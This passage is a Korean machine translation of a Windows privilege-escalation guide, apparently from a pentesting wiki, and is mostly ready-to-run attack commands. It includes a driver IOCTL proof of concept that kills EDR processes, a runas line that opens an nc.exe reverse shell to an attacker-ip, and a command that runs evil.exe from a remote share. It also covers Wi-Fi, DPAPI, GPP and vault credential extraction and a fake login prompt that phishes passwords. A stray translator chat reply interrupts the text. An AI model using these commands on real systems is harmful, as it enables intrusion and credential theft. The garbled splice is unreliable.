If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. 자세한 단계별 기술은 다음을 참조하세요:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. 전체 체인은 다음을 확인하세요:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

일부 서명된 서드파티 드라이버는 IoCreateDeviceSecure를 통해 강력한 SDDL로 device object를 생성하지만 DeviceCharacteristics에 FILE_DEVICE_SECURE_OPEN을 설정하는 것을 잊습니다. 이 플래그가 없으면, 추가 컴포넌트를 포함한 경로로 device를 열 때 secure DACL이 적용되지 않아, 권한 없는 사용자가 다음과 같은 네임스페이스 경로를 사용해 핸들을 얻을 수 있습니다:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

사용자가 device를 열 수 있게 되면, 드라이버가 노출한 권한 높은 IOCTLs을 LPE 및 변조에 악용할 수 있습니다. 실제 사례에서 관찰된 예시 능력:
- 임의 프로세스에 대한 full-access 핸들을 반환 (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- 제한 없는 raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL)을 포함한 임의의 프로세스를 종료하여, user land에서 kernel을 통해 AV/EDR kill이 가능하게 함.

최소 PoC 패턴 (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
개발자를 위한 완화 조치
- 항상 DACL로 제한할 의도로 생성하는 device objects에는 FILE_DEVICE_SECURE_OPEN을 설정하세요.
- 권한 있는 작업에 대해 호출자 컨텍스트를 검증하세요. 프로세스 종료나 handle 반환을 허용하기 전에 PP/PPL 검사를 추가하세요.
- IOCTLs를 제한하세요 (access masks, METHOD_*, 입력 검증) 및 직접 kernel privileges 대신 brokered models를 고려하세요.

방어자를 위한 탐지 아이디어
- 의심스러운 device names(예: \\ .\\amsdk*)과 남용을 시사하는 특정 IOCTL 시퀀스에 대한 user-mode opens를 모니터링하세요.
- Microsoft의 vulnerable driver blocklist (HVCI/WDAC/Smart App Control)를 적용하고 자체 허용/거부 목록을 유지하세요.


## PATH DLL Hijacking

PATH에 있는 폴더 안에 **write permissions**이 있으면 프로세스가 로드하는 DLL을 hijack하여 **escalate privileges**할 수 있습니다.

PATH 내의 모든 폴더의 권한을 확인하세요:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
이 체크를 악용하는 방법에 대한 자세한 정보:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 네트워크

### 공유
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인하세요
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 및 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

외부에서 **restricted services**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(규칙 나열, 규칙 생성, 끄기, 끄기...)**

추가[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows용 Linux 하위 시스템 (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
바이너리 `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다

root user 권한을 얻으면 어떤 포트에서든 수신(listen)할 수 있습니다 (포트에서 수신하기 위해 `nc.exe`를 처음 사용할 때 GUI를 통해 `nc`를 방화벽에서 허용할지 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash를 루트로 쉽게 시작하려면 `--default-user root`를 사용해 보세요

`WSL` 파일시스템은 폴더 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`에서 탐색할 수 있습니다

## Windows 자격 증명

### Winlogon 자격 증명
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault는 **Windows**가 **사용자를 자동으로 로그인시킬 수 있는** 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격증명을 저장합니다. 처음에는 사용자가 Facebook, Twitter, Gmail 등의 자격증명을 저장해 브라우저를 통해 자동으로 로그인하는 기능처럼 보일 수 있습니다. 하지만 그렇지 않습니다.

Windows Vault는 Windows가 자동으로 사용자를 로그인시킬 수 있는 자격증명을 저장하므로, 이는 즉 자원(서버 또는 웹사이트)에 접근하기 위해 자격증명이 필요한 **Windows application**이 이 **Credential Manager** 및 Windows Vault를 이용해 제공된 자격증명을 사용하여 사용자가 매번 사용자 이름과 비밀번호를 입력하는 대신 사용할 수 있다는 뜻입니다.

애플리케이션이 Credential Manager와 상호작용하지 않는 한 특정 자원에 대한 자격증명을 사용할 수 없을 것으로 보입니다. 따라서 애플리케이션이 vault를 사용하려면 기본 저장 vault에서 해당 자원의 자격증명을 요청하기 위해 **credential manager와 통신하여 해당 자원의 자격증명을 요청해야 합니다**.

머신에 저장된 자격증명을 나열하려면 `cmdkey`를 사용하세요.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `runas`를 `/savecred` 옵션과 함께 사용할 수 있습니다. 다음 예제는 SMB 공유를 통해 원격 바이너리를 호출합니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
제공된 자격 증명으로 `runas` 사용하기.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
참고로 mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), 또는 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)에서.

### DPAPI

The **Data Protection API (DPAPI)**는 데이터의 대칭 암호화를 위한 방법을 제공하며, 주로 Windows 운영체제 내에서 비대칭 개인 키를 대칭적으로 암호화하는 데 사용됩니다. 이 암호화는 엔트로피에 크게 기여하는 사용자 또는 시스템 비밀을 활용합니다.

**DPAPI는 사용자의 로그인 비밀에서 파생된 대칭 키를 통해 키를 암호화할 수 있게 합니다.** 시스템 암호화의 경우에는 시스템의 도메인 인증 비밀을 사용합니다.

DPAPI를 사용해 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 나타냅니다. **사용자의 개인 키를 보호하는 마스터 키와 동일 파일에 함께 위치한 DPAPI 키는** 일반적으로 64바이트의 무작위 데이터로 구성됩니다. (이 디렉터리에 대한 접근이 제한되어 CMD에서 `dir` 명령으로 내용을 나열할 수 없지만 PowerShell을 통해서는 나열할 수 있다는 점에 유의해야 합니다.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
적절한 인수(``/pvk`` 또는 ``/rpc``)를 사용하여 이를 복호화하려면 **mimikatz module** `dpapi::masterkey`를 사용할 수 있습니다.

**credentials files protected by the master password**는 일반적으로 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
적절한 `/masterkey`와 함께 **mimikatz module** `dpapi::cred`를 사용해 복호화할 수 있습니다.  
루트 권한인 경우 `sekurlsa::dpapi` 모듈로 **많은 DPAPI** **masterkeys**를 **memory**에서 추출할 수 있습니다.

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 자격 증명

**PowerShell credentials**는 종종 **scripting** 및 자동화 작업에서 암호화된 자격 증명을 편리하게 저장하는 방법으로 사용됩니다. 해당 자격 증명은 **DPAPI**로 보호되며, 일반적으로 생성된 동일한 사용자 및 동일한 컴퓨터에서만 복호화할 수 있습니다.

파일에 포함된 PS credentials를 **복호화**하려면 다음과 같이 할 수 있습니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 와이파이
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

다음 위치에서 찾을 수 있습니다: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
및 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 최근 실행된 명령
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 자격 증명 관리자**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
적절한 `/masterkey`와 함께 **Mimikatz** `dpapi::rdg` 모듈을 사용하여 모든 .rdg 파일을 **복호화**하십시오.\
Mimikatz `sekurlsa::dpapi` 모듈로 메모리에서 **많은 DPAPI masterkeys를 추출**할 수 있습니다.

### Sticky Notes

사용자들은 종종 Windows 워크스테이션에서 StickyNotes 앱을 사용하여 **비밀번호를 저장**하거나 기타 정보를 보관하지만, 이것이 데이터베이스 파일이라는 것을 모르는 경우가 많습니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 있으며 항상 찾아보고 조사할 가치가 있습니다.

### AppCmd.exe

**AppCmd.exe에서 비밀번호를 복구하려면 관리자 권한이고 높은 무결성 수준으로 실행되어야 한다는 점에 유의하세요.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` 디렉터리에 위치합니다.\
이 파일이 존재하면 일부 **credentials**가 구성되어 있고 **복구될 수 있습니다**.

이 코드는 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)에서 추출되었습니다:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인하세요.\
Installers는 **run with SYSTEM privileges**, 많은 설치 프로그램이 **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 파일 및 레지스트리 (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 안에 저장될 수 있으므로, 그곳에 흥미로운 항목이 있는지 확인하세요:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
해당 경로에 항목이 있다면 대개 저장된 SSH key일 것입니다. 이 항목은 암호화되어 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)를 사용하면 쉽게 복호화할 수 있습니다.\
이 기술에 대한 자세한 정보는 다음을 참조하세요: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

만약 `ssh-agent` 서비스가 실행 중이 아니고 부팅 시 자동으로 시작되게 하려면 다음을 실행하세요:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 기법은 더 이상 유효하지 않은 것 같습니다. ssh keys를 생성하고 `ssh-add`로 추가한 뒤 ssh로 머신에 로그인해 보았습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys는 존재하지 않았고 procmon은 비대칭 키 인증 동안 `dpapi.dll`의 사용을 식별하지 못했습니다.

### 방치된 파일
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
또한 **metasploit**의 _post/windows/gather/enum_unattend_ 모듈을 사용하여 이 파일들을 검색할 수 있습니다.

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 클라우드 자격 증명
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** 파일을 검색하세요.

### Cached GPP Pasword

예전에는 Group Policy Preferences (GPP)를 통해 여러 머신 그룹에 커스텀 로컬 administrator 계정을 배포할 수 있는 기능이 있었습니다. 그러나 이 방법에는 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPOs)는 도메인 사용자는 누구나 접근할 수 있었습니다. 둘째, 이러한 GPP 안의 패스워드들은 공개적으로 문서화된 기본 키를 사용해 AES256으로 암호화되어 있었고, 인증된 사용자라면 누구나 이를 복호화할 수 있었습니다. 이는 사용자가 권한을 상승시킬 수 있게 해주어 심각한 위험을 초래했습니다.

이 위험을 완화하기 위해, 로컬에 캐시된 GPP 파일 중 "cpassword" 필드가 비어있지 않은 파일을 스캔하는 함수가 개발되었습니다. 해당 파일을 발견하면, 함수는 패스워드를 복호화하고 커스텀 PowerShell 객체를 반환합니다. 이 객체에는 GPP 및 파일 위치에 대한 세부 정보가 포함되어 있어 이 보안 취약점을 식별하고 수정하는 데 도움을 줍니다.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec을 사용하여 비밀번호를 얻기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS 웹 구성
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
자격 증명이 포함된 web.config 예시:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials 요청하기

사용자가 알고 있을 것 같다고 생각되면, 항상 **사용자에게 본인의 credentials 또는 다른 사용자의 credentials까지 입력하도록 요청할 수 있습니다** (직접 **클라이언트**에게 **credentials**를 요청하는 것은 정말 **위험**합니다):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials를 포함할 수 있는 가능한 파일 이름**

알려진 파일들로, 과거에 일부는 **passwords**를 **clear-text** 또는 **Base64**로 포함하고 있었습니다.
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
어떤 파일들을 검색(번역)하길 원하시는지 파일 목록이나 해당 파일의 내용을 붙여 넣어 주세요.  
예: src/windows-hardening/windows-local-privilege-escalation/README.md 전체를 번역하길 원하면 그 파일 내용을 제공해 주세요.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin의 자격 증명

RecycleBin에서 자격 증명이 있는지 확인해야 합니다

To **암호 복구** 여러 프로그램에 저장된 비밀번호를 복구하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 레지스트리 내부

**자격 증명을 포함할 수 있는 다른 레지스트리 키**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

비밀번호가 저장된 **Chrome or Firefox**의 DB를 확인해야 합니다.\
또한 브라우저의 기록, 북마크 및 favourites도 확인하세요. 여기에 **비밀번호가** 저장돼 있을 수 있습니다.

브라우저에서 비밀번호를 추출하는 도구:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL 덮어쓰기**

**Component Object Model (COM)**은 Windows 운영체제 내장 기술로, 서로 다른 언어로 작성된 소프트웨어 구성요소들 간의 **상호통신**을 허용합니다. 각 COM 구성요소는 **class ID (CLSID)**로 식별되며, 각 구성요소는 하나 이상의 인터페이스를 통해 기능을 노출하고, 이들 인터페이스는 interface ID (IIDs)로 식별됩니다.

COM 클래스와 인터페이스는 각각 레지스트리의 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface** 아래에 정의됩니다. 이 레지스트리는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** 를 병합하여 생성되며 결과는 **HKEY\CLASSES\ROOT** 입니다.

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

기본적으로, 실행될 DLL 중 아무거나 **덮어쓸 수 있다면**, 그 DLL이 다른 사용자에 의해 실행될 경우 **escalate privileges** 할 수 있습니다.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **파일 및 레지스트리에서의 일반적인 비밀번호 검색**

**파일 내용 검색**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일 이름으로 파일 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호 검색**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 검색하는 도구들

